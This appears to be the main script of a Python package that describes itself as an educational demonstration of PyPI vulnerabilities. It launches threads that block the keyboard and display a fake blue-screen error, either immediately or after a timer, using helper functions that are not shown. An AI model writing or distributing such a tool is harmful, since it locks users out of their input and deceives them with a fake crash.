from os import environ
environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'

import argparse
import threading
from .utils import *

def main():
    parser = argparse.ArgumentParser(description="This library is designed exclusively to demonstrate potential vulnerabilities in the PyPI (Python Package Index) platform. Note: I do not take any responsibility for any unintended consequences or damage that may arise from its use. The creation of this library is intended purely for educational and experimental purposes.")
    parser.add_argument("-t", "--timer", type=int, help="Set the BSOD timer in seconds")

    args = parser.parse_args()
    
    if not any(vars(args).values()):
        threading.Thread(target=block_keyboard).start()
        threading.Thread(target=show_error).start()

    if args.timer:
        time.sleep(int(args.timer))
        threading.Thread(target=block_keyboard).start()
        threading.Thread(target=show_error).start()


if __name__ == "__main__":
    main()